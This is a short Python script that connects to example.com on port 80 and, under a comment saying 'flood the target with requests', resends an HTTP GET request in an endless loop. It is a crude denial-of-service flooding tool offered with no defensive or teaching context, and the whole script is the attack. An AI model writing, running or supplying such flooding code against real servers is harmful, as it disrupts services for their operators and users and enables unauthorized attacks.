import socket

target = "example.com"
port = 80

# create a socket object
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connect the client
client.connect((target, port))

# send a request
message = "GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n"
client.send(message.encode())

# flood the target with requests
while True:
    client.send(message.encode())
